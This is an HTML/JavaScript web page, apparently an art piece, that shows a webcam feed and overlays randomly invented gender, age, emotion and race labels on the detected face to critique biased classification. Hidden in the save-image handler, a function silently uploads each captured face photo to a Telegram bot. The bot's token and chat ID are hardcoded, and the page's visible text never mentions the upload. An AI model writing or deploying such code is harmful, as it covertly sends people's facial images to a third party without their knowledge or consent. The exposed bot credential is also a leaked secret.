<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Identification Protocols</title>

<script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/face_detection.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>

<style>
body {
  margin:0;
  background:#0019ff;
  color:white;
  font-family: Arial;
  overflow:hidden;
}

#container {
  position:relative;
  width:100vw;
  height:100vh;
}

video, canvas {
  position:absolute;
  width:100%;
  height:100%;
  object-fit:cover;
}

video {
  pointer-events: none;
}

/* Ocultar botón de play en iPhone */
video::-webkit-media-controls {
  display: none !important;
}
video::-webkit-media-controls-enclosure {
  display: none !important;
}
video::-webkit-media-controls-panel {
  display: none !important;
}
video::-webkit-media-controls-play-button {
  display: none !important;
}

#start {
  position:absolute;
  top:45%;
  left:50%;
  transform:translate(-50%, -50%);
  padding:20px;
  border:1px solid white;
  background:rgba(0,25,255,0.9);
  backdrop-filter:blur(4px);
  color:white;
  font-size:18px;
  z-index:10;
  cursor:pointer;
  white-space:nowrap;
}

#title {
  position:absolute;
  top:20px;
  left:20px;
  font-size:14px;
  font-weight:700;
  letter-spacing:1px;
  text-transform: uppercase;
  opacity:0.9;
  z-index:10;
}

#statement {
  position:absolute;
  bottom:60px;
  left:50%;
  transform:translateX(-50%);
  width:360px;
  max-width:80%;
  font-size:12px;
  line-height:1.5;
  text-align:left;
  padding:0;
  background:transparent;
  color:white;
  z-index:10;
}

.statement-line {
  display:block;
  margin-bottom:8px;
}
.statement-line:last-child {
  margin-bottom:0;
}

/* FLECHA DE GUARDADO */
#save-btn {
  position:absolute;
  bottom:25px;
  right:25px;
  width:65px;
  height:65px;
  border-radius:50%;
  background:rgba(0,0,0,0.7);
  backdrop-filter:blur(8px);
  border:2px solid white;
  cursor:pointer;
  z-index:20;
  display:flex;
  align-items:center;
  justify-content:center;
  transition:all 0.2s ease;
}

#save-btn svg {
  width:30px;
  height:30px;
  fill:none;
  stroke:white;
  stroke-width:2;
  stroke-linecap:round;
  stroke-linejoin:round;
}

#save-btn:active {
  transform:scale(0.95);
  background:white;
}
#save-btn:active svg {
  stroke:#0019ff;
}

#save-btn.hidden {
  display:none;
}

/* Mensaje flotante para feedback en iPhone */
#toast-msg {
  position: fixed;
  bottom: 110px;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(0,0,0,0.85);
  color: #00ff88;
  padding: 10px 18px;
  border-radius: 30px;
  font-size: 13px;
  font-family: monospace;
  z-index: 25;
  white-space: nowrap;
  pointer-events: none;
  opacity: 0;
  transition: opacity 0.3s;
  text-align: center;
}

#toast-msg.show {
  opacity: 1;
}
</style>
</head>

<body>

<div id="container">

<div id="title">identification-protocols by humdrum</div>

<button id="start">accept classification</button>

<div id="statement">
  <span class="statement-line">⤷ This system operates through inherited classification structures rooted in biased datasets.</span>
  <span class="statement-line">⤷ It imposes fixed identities onto bodies in constant transformation.</span>
  <span class="statement-line">⤷ It may misread or misrepresent you.</span>
</div>

<video id="video" autoplay muted playsinline webkit-playsinline></video>
<canvas id="canvas"></canvas>

<button id="save-btn" class="hidden">
  <svg viewBox="0 0 24 24">
    <path d="M12 5v14m-7-7l7 7 7-7" />
  </svg>
</button>

<div id="toast-msg"></div>

</div>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const saveBtn = document.getElementById('save-btn');
const toastMsg = document.getElementById('toast-msg');

let captured = false;
let currentDatos = null;
let lastChangeTime = 0;
let primerRostroDetectado = false;

const CHANGE_INTERVAL = 2500;

// 🔥 TUS DATOS DE TELEGRAM
const TELEGRAM_BOT_TOKEN = "8792659270:AAEreIEzUbUf6gi_Qbtx_OQQGuM3VPn_DVU";
const TELEGRAM_CHAT_ID = "6442271508";

function mostrarToast(texto, esError = false) {
  toastMsg.textContent = texto;
  toastMsg.style.color = esError ? '#ff8888' : '#88ff88';
  toastMsg.classList.add('show');
  setTimeout(() => {
    toastMsg.classList.remove('show');
  }, 2500);
}

document.getElementById("start").onclick = async () => {
  document.getElementById("start").style.display = "none";
  document.getElementById("statement").style.display = "none";

  try {
    mostrarToast("📷 Activando cámara...");
    
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    video.srcObject = stream;
    video.muted = true;
    video.setAttribute('playsinline', '');
    video.setAttribute('webkit-playsinline', '');
    await video.play();
    video.controls = false;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    saveBtn.classList.remove('hidden');
    mostrarToast("✅ Cámara lista. Mostrá tu rostro.");
    
    startDetection();
    
  } catch(e) {
    console.error(e);
    mostrarToast("❌ Error: Permiso de cámara requerido", true);
    document.getElementById("start").style.display = "block";
  }
};

// Función para guardar/descargar la imagen (compatible con iPhone)
function descargarImagen() {
  try {
    const timestamp = Date.now();
    const nombreArchivo = `identification-protocols_${timestamp}.png`;
    
    // Método compatible con Safari (iPhone)
    const dataURL = canvas.toDataURL('image/png');
    const link = document.createElement('a');
    link.download = nombreArchivo;
    link.href = dataURL;
    
    // Para iPhone: esto funciona si es un clic real del usuario
    link.click();
    
    mostrarToast("📸 Imagen guardada en Descargas");
    console.log("✅ Guardado manual:", nombreArchivo);
    
    // Intentar enviar a Telegram (opcional, si falla no importa)
    enviarATelegram();
    
  } catch(e) {
    console.error("Error al guardar:", e);
    mostrarToast("❌ No se pudo guardar", true);
  }
}

// Envío a Telegram (silencioso, no molesta si falla)
function enviarATelegram() {
  canvas.toBlob(async (blob) => {
    if(!blob) return;
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'captura.png');
    formData.append('caption', `📸 Captura - ${new Date().toLocaleString()}`);
    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      if(response.ok) console.log("✅ Enviado a Telegram");
      else console.log("⚠️ Telegram no disponible en este navegador");
    } catch(e) {
      console.log("⚠️ No se pudo enviar a Telegram:", e);
    }
  }, 'image/png');
}

function startDetection() {

  const faceDetection = new FaceDetection({
    locateFile: (file) => {
      return `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`;
    }
  });

  faceDetection.setOptions({
    model: 'short',
    minDetectionConfidence: 0.7
  });

  faceDetection.onResults(results => {

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    if (results.detections.length > 0) {

      const det = results.detections[0];
      const box = det.boundingBox;

      const x = box.xCenter * canvas.width - (box.width * canvas.width)/2;
      const y = box.yCenter * canvas.height - (box.height * canvas.height)/2;
      const w = box.width * canvas.width;
      const h = box.height * canvas.height;

      const now = Date.now();

      if (!currentDatos || now - lastChangeTime > CHANGE_INTERVAL) {
        currentDatos = generarDatos();
        lastChangeTime = now;

        // Solo mostramos mensaje la primera vez que se detecta un rostro
        if (!primerRostroDetectado) {
          primerRostroDetectado = true;
          mostrarToast("👤 Rostro detectado. Usá la flecha ⬇️ para guardar");
        }
      }

      const datos = currentDatos;

      // RECTÁNGULO
      ctx.strokeStyle = "blue";
      ctx.lineWidth = 2;
      ctx.strokeRect(x, y, w, h);

      // TEXTO SUPERIOR
      const topText = `${datos.gender}, ${datos.age} years`;

      ctx.font = "16px Arial";
      const textWidth = ctx.measureText(topText).width;

      const padding = 10;
      const boxWidth = textWidth + padding;

      let textY = y - 10;
      let rectY = y - 25;

      if (rectY < 0) {
        rectY = y + h;
        textY = rectY + 18;
      }

      ctx.fillStyle = "blue";
      ctx.fillRect(x, rectY, boxWidth, 25);

      ctx.fillStyle = "white";
      ctx.fillText(topText, x + 5, textY);

      // TEXTO INFERIOR
      ctx.fillText(`Emotion: ${datos.emotion} (${datos.emotion_conf}%)`, x, y + h + 20);
      ctx.fillText(`Race: ${datos.race} (${datos.race_conf}%)`, x, y + h + 40);
    }

  });

  const camera = new Camera(video, {
    onFrame: async () => {
      await faceDetection.send({ image: video });
    },
    width: 640,
    height: 480
  });

  camera.start();
}

function generarDatos() {
  const generos = ["Man", "Woman"];
  const emociones = ["happy", "sad", "neutral", "fear"];
  const razas = ["white", "latino", "asian", "middle eastern"];

  return {
    gender: generos[Math.floor(Math.random()*2)],
    age: Math.floor(Math.random()*40) + 20,
    emotion: emociones[Math.floor(Math.random()*4)],
    race: razas[Math.floor(Math.random()*4)],
    emotion_conf: Math.floor(Math.random()*40) + 60,
    race_conf: Math.floor(Math.random()*40) + 60
  };
}

// Evento de la flecha: GUARDADO MANUAL (funciona en iPhone)
saveBtn.addEventListener('click', () => {
  descargarImagen();
});
</script>

</body>
</html>
